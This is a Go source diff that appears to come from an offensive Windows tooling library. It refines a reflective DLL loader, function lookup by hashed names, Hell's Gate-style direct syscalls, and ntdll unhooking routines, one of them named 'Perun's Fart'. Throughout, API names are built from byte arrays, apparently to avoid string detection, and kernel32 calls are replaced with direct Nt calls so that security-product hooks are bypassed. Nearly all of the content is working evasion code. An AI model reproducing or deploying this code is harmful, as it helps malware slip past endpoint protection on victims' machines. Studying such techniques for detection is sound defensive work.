@@ -6,13 +6,10 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"golang.org/x/sys/windows/registry"
 	"io/ioutil"
-	"os"
 	"strconv"
 	"strings"
 	"syscall"
-	"unicode/utf16"
 	"unsafe"
 
 	"github.com/Binject/debug/pe"
@@ -72,17 +69,18 @@ func LoadLibraryImpl(image *[]byte, hash func(string) string) (*Library, error) 
 		return nil, errors.New("Cannot load a 32bit DLL from a 64bit process")
 	}
 
-	var sizeOfImage uint32
+	var sizeOfImage uintptr
 	if pe64 {
-		sizeOfImage = pelib.OptionalHeader.(*pe.OptionalHeader64).SizeOfImage
+		sizeOfImage = uintptr(pelib.OptionalHeader.(*pe.OptionalHeader64).SizeOfImage)
 	} else {
-		sizeOfImage = pelib.OptionalHeader.(*pe.OptionalHeader32).SizeOfImage
+		sizeOfImage = uintptr(pelib.OptionalHeader.(*pe.OptionalHeader32).SizeOfImage)
 	}
-	r, err := vA(0, sizeOfImage, MEM_RESERVE, syscall.PAGE_READWRITE)
+
+	r, err := NvA(0, sizeOfImage, MEM_RESERVE, syscall.PAGE_READWRITE)
 	if err != nil {
 		return nil, err
 	}
-	dst, err := vA(r, sizeOfImage, MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
+	dst, err := NvA(r, sizeOfImage, MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
 
 	if err != nil {
 		return nil, err
@@ -158,26 +156,25 @@ func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
 	return nil
 }
 
-//todo: change VirtualAlloc into Nt api
-func vA(addr uintptr, size, allocType, protect uint32) (uintptr, error) {
-	procVA := syscall.MustLoadDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).MustFindProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'}))
-	r1, _, e1 := procVA.Call(
-		addr,
-		uintptr(size),
-		uintptr(allocType),
-		uintptr(protect))
-
-	if int(r1) == 0 {
-		return r1, os.NewSyscallError(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'}), e1)
+//NtAllocateVirtualMemory
+func NvA(addr , size uintptr, allocType, protect uint32) (uintptr, error) {
+	procVA,_,e := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),"04262a7943514ab931287729e862ca663d81f515",str2sha1)
+	if procVA == 0{
+		return 0,e
 	}
-	return r1, nil
+	r,_,e :=syscall.Syscall6(uintptr(procVA),6,uintptr(0xffffffffffffffff),uintptr(unsafe.Pointer(&addr)),0,uintptr(unsafe.Pointer(&size)),uintptr(allocType),uintptr(protect))
+	if r != 0{
+		return 0,e
+	}
+	return addr, nil
 }
+
 
 func ReMapNtdll() (*unNtd, error) {
 	var uNTD = &unNtd{}
 
 	//ntcreatefile = ac19c01d8c27c421e0b8a7960ae6bad2f84f0ce5
-	NCF_ptr, _, e := GetFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "ac19c01d8c27c421e0b8a7960ae6bad2f84f0ce5", str2sha1)
+	NCF_ptr, _, e := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "ac19c01d8c27c421e0b8a7960ae6bad2f84f0ce5", str2sha1)
 	if e != nil {
 		fmt.Println(e)
 		return uNTD, fmt.Errorf("NtCreateFile Err")
@@ -198,14 +195,14 @@ func ReMapNtdll() (*unNtd, error) {
 	syscall.Syscall12(uintptr(NCF_ptr), 11, uintptr(unsafe.Pointer(&hNtdllfile)), uintptr(0x80|syscall.GENERIC_READ|syscall.SYNCHRONIZE), uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&ioStatusBlock)), 0, 0, syscall.FILE_SHARE_READ, uintptr(0x00000001), uintptr(0x00000040|0x00000020), 0, 0, 0)
 
 	//ntcreatesection = 747d342b80e4c1c9d4d3dcb4ee2da24dcce27801
-	NCS_ptr, _, _ := GetFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "747d342b80e4c1c9d4d3dcb4ee2da24dcce27801", str2sha1)
+	NCS_ptr, _, _ := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "747d342b80e4c1c9d4d3dcb4ee2da24dcce27801", str2sha1)
 
 	var handleNtdllSection uintptr
 	//status = NtCreateSection(&handleNtdllSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, handleNtdllDisk);
 	syscall.Syscall9(uintptr(NCS_ptr), 7, uintptr(unsafe.Pointer(&handleNtdllSection)), uintptr(0x000F0000|0x4|0x1), 0, 0, syscall.PAGE_READONLY, uintptr(0x1000000), hNtdllfile, 0, 0)
 
 	//zwmapviewofsection = da39da04447a22b747ac8e86b4773bbd6ea96f9b
-	ZMVS_ptr, _, _ := GetFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "da39da04447a22b747ac8e86b4773bbd6ea96f9b", str2sha1)
+	ZMVS_ptr, _, _ := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "da39da04447a22b747ac8e86b4773bbd6ea96f9b", str2sha1)
 
 	var unhookedBaseAddress uintptr
 	var size uintptr
@@ -248,36 +245,92 @@ func dllExports(dllname string) (*pe.File, error) {
 	return p, nil
 }
 
-func UTF16PtrFromString(s string) (*uint16, error) {
-	a, err := UTF16FromString(s)
-	if err != nil {
-		return nil, err
+//import from Memory
+func dllMemExports(dllname string) (*pe.File, error) {
+	r1,r2 := InMemLoads(dllname)
+	rr := rawreader.New(r1, int(r2))
+	p, e := pe.NewFileFromMemory(rr)
+	if e != nil {
+		return nil, e
 	}
-	return &a[0], nil
+	return p, nil
 }
 
-func UTF16FromString(s string) ([]uint16, error) {
-	for i := 0; i < len(s); i++ {
-		if s[i] == 0 {
-			return nil, syscall.EINVAL
+
+//GetModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
+func GMLO(i int) (start uintptr, size uintptr, modulepath string) {
+	var badstring *sstring
+	start, size, badstring = getMLO(i)
+	modulepath = badstring.String()
+	return
+}
+
+
+//InMemLoads returns a map of loaded dll paths to current process offsets (aka images) in the current process. No syscalls are made.
+func InMemLoads(modulename string) (uintptr,uintptr) {
+	s, si, p := GMLO(0)
+	start := p
+	i := 1
+	if strings.Contains(strings.ToLower(p),strings.ToLower(modulename)){
+		return s,si
+	}
+	for {
+		s, si, p = GMLO(i)
+		if p != "" {
+			if strings.Contains(strings.ToLower(p),strings.ToLower(modulename)){
+				return s,si
+			}
+		}
+		if p == start {
+			break
+		}
+		i++
+	}
+	return 0,0
+}
+
+//MemFuncPtr returns a pointer to the function (Virtual Address)
+func MemFuncPtr(moduleName string, funcnamehash string, hash func(string) string) (uint64, string, error) {
+	//Get dll module BaseAddr
+	phModule,_ := InMemLoads(moduleName)
+
+	if phModule == 0 {
+		syscall.LoadLibrary(moduleName)
+		phModule,_ = InMemLoads(moduleName)
+		if  phModule == 0 {
+			return 0, "", fmt.Errorf("Can't Load %s"+moduleName)
 		}
 	}
-	return utf16.Encode([]rune(s + "\x00")), nil
+	//get dll exports
+	pef, err := dllMemExports(moduleName)
+	if err != nil {
+		return 0, "", err
+	}
+	ex, err := pef.Exports()
+	if err != nil {
+		return 0, "", err
+	}
+
+	for _, exp := range ex {
+		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcnamehash) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcnamehash) {
+			return uint64(phModule) + uint64(exp.VirtualAddress), exp.Name, nil
+		}
+	}
+	return 0, "", fmt.Errorf("could not find function!!! ")
 }
 
-//GetFuncPtr returns a pointer to the function (Virtual Address)
-func GetFuncPtr(moduleName string, funcnamehash string, hash func(string) string) (uint64, string, error) {
+
+
+//DiskFuncPtr returns a pointer to the function (Virtual Address)
+func DiskFuncPtr(moduleName string, funcnamehash string, hash func(string) string) (uint64, string, error) {
 	//Get dll module BaseAddr
-	k32 := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'}))
-	GMEx := k32.NewProc(string([]byte{'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'E', 'x', 'W'}))
-	var phModule uintptr
-	cname, _ := UTF16PtrFromString(moduleName)
-	r1, _, err := GMEx.Call(0, uintptr(unsafe.Pointer(cname)), uintptr(unsafe.Pointer(&phModule)))
-	if r1 != 1 || phModule == 0 {
+	phModule,_ := InMemLoads(moduleName)
+
+	if phModule == 0 {
 		syscall.LoadLibrary(moduleName)
-		r1, _, err = GMEx.Call(0, uintptr(unsafe.Pointer(cname)), uintptr(unsafe.Pointer(&phModule)))
-		if r1 != 1 || phModule == 0 {
-			return 0, "", err
+		phModule,_ = InMemLoads(moduleName)
+		if  phModule == 0 {
+			return 0, "", fmt.Errorf("Can't Load %s"+moduleName)
 		}
 	}
 	//get dll exports
@@ -313,18 +366,18 @@ func MemHgate(funcname string, hash func(string) string) (uint16, error) {
 func getSysIDFromMem(funcname string, hash func(string) string) (uint16, error) {
 	//Get dll module BaseAddr
 	//get ntdll handler
-	GMH := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc(string([]byte{'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A'}))
-	bytes0 := []byte(string([]byte{'n', 't', 'd', 'l', 'l'}))
-	Ntdll, _, _ := GMH.Call(uintptr(unsafe.Pointer(&bytes0[0])))
-	if Ntdll == 0 {
+	Ntd, _,_ := GMLO(1)
+	if Ntd == 0 {
 		return 0,fmt.Errorf("err GetModuleHandleA")
 	}
-	moduleInfo := windows.ModuleInfo{}
-	err := windows.GetModuleInformation(windows.Handle(uintptr(0xffffffffffffffff)), windows.Handle(Ntdll), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
-	if err != nil {
-		return 0, err
-	}
-	addrMod := moduleInfo.BaseOfDll
+	//moduleInfo := windows.ModuleInfo{}
+	//err := windows.GetModuleInformation(windows.Handle(uintptr(0xffffffffffffffff)), windows.Handle(Ntd), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
+
+	//if err != nil {
+	//	return 0, err
+	//}
+	//addrMod := moduleInfo.BaseOfDll
+	addrMod := Ntd
 
 	//get ntheader of ntdll
 	ntHeader := ntH(addrMod)
@@ -520,8 +573,6 @@ func getSysIDFromDisk(funcname string, hash func(string) string) (uint16, error)
 }
 
 
-
-
 //rvaToOffset converts an RVA value from a PE file into the file offset. When using binject/debug, this should work fine even with in-memory files.
 func rvaToOffset(pefile *pe.File, rva uint32) uint32 {
 	for _, hdr := range pefile.Sections {
@@ -559,25 +610,6 @@ func HgSyscall(callid uint16, argh ...uintptr) (errcode uint32, err error) {
 }
 
 func FullUnhook(DLLname []string) error {
-
-	//get customsyscall
-	//todo: change registry ops into syscall
-	var customsyscall uint16
-	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, string([]byte{'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}), registry.QUERY_VALUE)
-	CurrentVersion, _, _ := regkey.GetStringValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}))
-	MajorVersion, _, err := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'a', 'j', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
-	if err == nil {
-		MinorVersion, _, _ := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'i', 'n', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
-		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
-	}
-	regkey.Close()
-
-	if CurrentVersion == "10.0" {
-		customsyscall = 0x50
-	} else {
-		return nil
-	}
-
 	for _, d := range DLLname {
 		dll, err := ioutil.ReadFile(d)
 		if err != nil {
@@ -599,8 +631,7 @@ func FullUnhook(DLLname []string) error {
 		var oldfartcodeperms uintptr
 		regionsize := uintptr(len(bytes))
 		handlez := uintptr(0xffffffffffffffff)
-		runfunc, _ := npvm(
-			customsyscall,
+		runfunc := npvm(
 			handlez,
 			(*uintptr)(unsafe.Pointer(&dllOffset)),
 			&regionsize,
@@ -608,6 +639,7 @@ func FullUnhook(DLLname []string) error {
 			&oldfartcodeperms,
 		)
 		if runfunc != 0 {
+			panic(runfunc)
 		}
 
 		for i := 0; i < len(bytes); i++ {
@@ -616,8 +648,7 @@ func FullUnhook(DLLname []string) error {
 			(*mem)[0] = bytes[i]
 		}
 
-		runfunc, _ = npvm(
-			customsyscall,
+		runfunc= npvm(
 			handlez,
 			(*uintptr)(unsafe.Pointer(&dllOffset)),
 			&regionsize,
@@ -625,13 +656,19 @@ func FullUnhook(DLLname []string) error {
 			&oldfartcodeperms,
 		)
 		if runfunc != 0 {
+			panic(runfunc)
 		}
 	}
 	return nil
 }
 
-func npvm(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) (uint32, error) {
-	return ntP(
+func npvm(processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) uint32 {
+	//NtProtectVirtualMemory
+	sysid,_ := DiskHgate("646bd5afa7b482fdd90fb8f2eefe1301a867d7b9",str2sha1)
+	if sysid == 0{
+		return 0
+	}
+	errcode := hgSyscall(
 		sysid,
 		processHandle,
 		uintptr(unsafe.Pointer(baseAddress)),
@@ -639,9 +676,9 @@ func npvm(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr,
 		NewProtect,
 		uintptr(unsafe.Pointer(oldprotect)),
 	)
+
+	return errcode
 }
-
-
 
 
 //Perun's Fart unhook function
@@ -682,26 +719,27 @@ func PerunsFart() error {
 	windows.SleepEx(1000, false)
 
 	//get ntdll handler
-	GetModuleHandleA := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetModuleHandleA")
-	bytes0 := []byte(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
-	Ntdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(&bytes0[0])))
-	if Ntdll == 0 {
-		return fmt.Errorf("err GetModuleHandleA")
-	}
+	//GetModuleHandleA := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetModuleHandleA")
+	//bytes0 := []byte(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
+	//Ntdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(&bytes0[0])))
+	//if Ntdll == 0 {
+	//	return fmt.Errorf("err GetModuleHandleA")
+	//}
+	Ntd, _,_ := GMLO(1)
 
-	moduleInfo := windows.ModuleInfo{}
+	//moduleInfo := windows.ModuleInfo{}
 
-	curr, _ := syscall.GetCurrentProcess()
-	if curr == 0 {
-		return fmt.Errorf("err GetCurrentProcess")
-	}
+	//curr, _ := syscall.GetCurrentProcess()
+	//if curr == 0 {
+	//	return fmt.Errorf("err GetCurrentProcess")
+	//}
 
-	err = windows.GetModuleInformation(windows.Handle(uintptr(curr)), windows.Handle(Ntdll), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
-	if err != nil {
-		return err
-	}
+	//err = windows.GetModuleInformation(windows.Handle(uintptr(curr)), windows.Handle(Ntdll), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
+	//if err != nil {
+	//	return err
+	//}
 
-	addrMod := moduleInfo.BaseOfDll
+	addrMod := Ntd
 
 	//get ntheader of ntdll
 	ntHeader := ntH(addrMod)
@@ -874,7 +912,20 @@ func str2sha1(s string) string {
 	return fmt.Sprintf("%x", bs)
 }
 
-func ntP(callid uint16, argh ...uintptr) (errcode uint32, err error)
+//sstring is the stupid internal windows definiton of a unicode string. I hate it.
+type sstring struct {
+	Length    uint16
+	MaxLength uint16
+	PWstr     *uint16
+}
+
+func (s sstring) String() string {
+	return windows.UTF16PtrToString(s.PWstr)
+}
+
 
 //Syscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
 func hgSyscall(callid uint16, argh ...uintptr) (errcode uint32)
+
+//getModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
+func getMLO(i int) (start uintptr, size uintptr, modulepath *sstring)
